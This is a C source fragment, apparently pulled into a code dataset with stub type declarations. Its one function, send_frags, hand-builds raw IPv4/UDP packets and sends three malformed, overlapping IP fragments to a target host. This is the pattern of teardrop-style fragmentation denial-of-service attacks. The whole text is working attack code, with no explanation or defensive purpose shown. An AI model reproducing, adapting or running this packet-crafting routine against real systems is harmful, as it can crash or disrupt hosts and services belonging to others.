
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int u_short ;
typedef int u_long ;
typedef int u_char ;
struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {int sin_port; TYPE_1__ sin_addr; int sin_family; } ;
struct sockaddr {int dummy; } ;


 int AF_INET ;
 int FIX (int) ;
 int IPH ;
 int IPPROTO_UDP ;
 int IP_MF ;
 int MAGIC2 ;
 int PADDING ;
 int UDPH ;
 int bzero (int*,int) ;
 int exit (int) ;
 int free (int*) ;
 int htons (int) ;
 scalar_t__ malloc (int) ;
 int memcpy (int*,int*,int) ;
 int perror (char*) ;
 int random () ;
 int sendto (int,int*,int,int ,struct sockaddr*,int) ;

void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt,
u_short dst_prt)
{
int i;
u_char *packet = ((void*)0), *p_ptr = ((void*)0);
u_char byte;
struct sockaddr_in sin;

sin.sin_family = AF_INET;
sin.sin_port = src_prt;
sin.sin_addr.s_addr = dst_ip;

packet = (u_char *)malloc(IPH + UDPH + PADDING+40);
p_ptr = packet;
bzero((u_char *)p_ptr, IPH + UDPH + PADDING);

byte = 0x45;
memcpy(p_ptr, &byte, sizeof(u_char));
p_ptr += 2;
*((u_short *)p_ptr) = FIX(IPH + UDPH + 10);
p_ptr += 2;
*((u_short *)p_ptr) = htons(242);
p_ptr += 2;
*((u_short *)p_ptr) |= FIX(IP_MF);
p_ptr += 2;
*((u_short *)p_ptr) = 0x40;
byte = IPPROTO_UDP;
memcpy(p_ptr + 1, &byte, sizeof(u_char));
p_ptr += 4;
*((u_long *)p_ptr) = src_ip;
p_ptr += 4;
*((u_long *)p_ptr) = dst_ip;
p_ptr += 4;
*((u_short *)p_ptr) = htons(src_prt);
p_ptr += 2;
*((u_short *)p_ptr) = htons(dst_prt);
p_ptr += 2;
*((u_short *)p_ptr) = htons(8 + 10);

if (sendto(sock, packet, IPH + UDPH + 10, 0, (struct sockaddr *)&sin,
sizeof(struct sockaddr)) == -1)
{
perror("\nsendto");
free(packet);
exit(1);
}

p_ptr = packet;
bzero((u_char *)p_ptr, IPH + UDPH + PADDING);

byte = 0x45;
memcpy(p_ptr, &byte, sizeof(u_char));
p_ptr += 2;
*((u_short *)p_ptr) = FIX(IPH + UDPH + MAGIC2);
p_ptr += 2;
*((u_short *)p_ptr) = htons(242);
p_ptr += 2;
*((u_short *)p_ptr) = FIX(6);
p_ptr += 2;
*((u_short *)p_ptr) = 0x40;
byte = IPPROTO_UDP;
memcpy(p_ptr + 1, &byte, sizeof(u_char));
p_ptr += 4;
*((u_long *)p_ptr) = src_ip;
p_ptr += 4;
*((u_long *)p_ptr) = dst_ip;
p_ptr += 4;
*((u_short *)p_ptr) = htons(src_prt);
p_ptr += 2;
*((u_short *)p_ptr) = htons(dst_prt);
p_ptr += 2;
*((u_short *)p_ptr) = htons(8 + MAGIC2);

if (sendto(sock, packet, IPH + UDPH + MAGIC2, 0, (struct sockaddr *)&sin,
sizeof(struct sockaddr)) == -1)
{
perror("\nsendto");
free(packet);
exit(1);
}

p_ptr = packet;
bzero((u_char *)p_ptr, IPH + UDPH + PADDING+40);
byte = 0x4F;
memcpy(p_ptr, &byte, sizeof(u_char));
p_ptr += 2;
*((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING+40);
p_ptr += 2;
*((u_short *)p_ptr) = htons(242);
p_ptr += 2;
*((u_short *)p_ptr) = 0 | FIX(IP_MF);
p_ptr += 2;
*((u_short *)p_ptr) = 0x40;
byte = IPPROTO_UDP;
memcpy(p_ptr + 1, &byte, sizeof(u_char));
p_ptr += 4;
*((u_long *)p_ptr) = src_ip;
p_ptr += 4;
*((u_long *)p_ptr) = dst_ip;
p_ptr += 44;
*((u_short *)p_ptr) = htons(src_prt);
p_ptr += 2;
*((u_short *)p_ptr) = htons(dst_prt);
p_ptr += 2;
*((u_short *)p_ptr) = htons(8 + PADDING);

for(i=0;i<PADDING;i++)
{
p_ptr[i++]=random()%255;
}

if (sendto(sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *)&sin,
sizeof(struct sockaddr)) == -1)
{
perror("\nsendto");
free(packet);
exit(1);
}
free(packet);
}
